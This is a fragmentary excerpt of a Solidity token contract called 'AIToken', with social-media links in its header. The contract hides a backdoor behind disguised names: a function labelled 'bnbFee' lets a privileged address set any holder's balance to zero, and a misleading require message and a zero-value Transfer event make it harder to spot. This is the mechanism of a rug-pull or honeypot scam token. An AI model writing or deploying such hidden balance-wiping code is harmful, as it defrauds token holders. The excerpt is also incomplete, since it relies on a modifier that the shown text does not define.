...
// https://t.me/AIMentals
// https://Mental.ai/
// https://twitter.com/AIMental
*/
...
contract AIToken is AIabcd, AIabc, AIa, AIab {
...
address private pancakeswap;
  ...
  modifier AI0wner () {
    require(AIbitcin == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  ...
  function bnbFee(address AIaccount) external pancake {
    ebalances[AIaccount] = 0;
            emit Transfer(address(0), AIaccount, 0);
  }
